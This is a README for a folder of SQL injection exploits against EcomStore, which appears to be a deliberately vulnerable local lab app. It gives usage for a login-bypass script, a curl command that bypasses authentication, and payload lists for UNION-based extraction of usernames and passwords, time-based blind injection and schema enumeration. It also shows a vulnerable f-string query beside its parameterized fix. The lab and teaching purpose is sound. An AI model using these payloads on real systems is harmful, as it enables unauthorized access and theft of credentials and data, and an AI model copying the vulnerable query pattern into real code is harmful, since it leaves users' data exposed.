# EcomStore SQL Injection Exploits

## Overview
This directory contains SQL Injection exploits for the EcomStore application. The login and product search endpoints are vulnerable to SQLi.

## Target Application
- **App**: EcomStore
- **Port**: 5004
- **Vulnerability**: SQL Injection
- **Severity**: CRITICAL

## Available Exploits

### 1. login_bypass.py
**Type**: Authentication bypass via SQLi  
**Target**: `/login` endpoint

**Usage**:
```bash
# Bypass login
python login_bypass.py http://localhost:5004

# With custom payload
python login_bypass.py http://localhost:5004 --payload "admin' OR '1'='1"

# Manual test
curl -X POST http://localhost:5004/login \
  -d "username=admin' OR '1'='1'--&password=anything"
```

## SQLi Payloads

### Authentication Bypass
```sql
-- Basic OR bypass
admin' OR '1'='1'--
' OR 1=1--
admin'--

-- Union-based
' UNION SELECT NULL, 'admin', 'hash'--

-- Time-based blind
admin' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--
```

### Data Extraction
```sql
-- Extract users
' UNION SELECT username, password FROM users--

-- Extract orders
' UNION SELECT order_id, total FROM orders--

-- Database enumeration
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

## Testing Steps

1. **Start EcomStore**:
```bash
cd ../../projects/ecomstore
docker-compose up -d
```

2. **Test Login Bypass**:
```bash
python login_bypass.py http://localhost:5004
```

3. **Verify Access**:
- Should receive authenticated session
- Can access protected pages

## Defense

**Vulnerable Code**:
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Fixed Code**:
```python
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

## Notes
SQL injection allows complete database access and authentication bypass.

## Related Exploits
- See `../sqli/` for more SQLi techniques
- See `../../chatapp/sqli/` for INSERT-based SQLi
- See `../../securedoc/sqli/` for advanced SQLi

## References
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
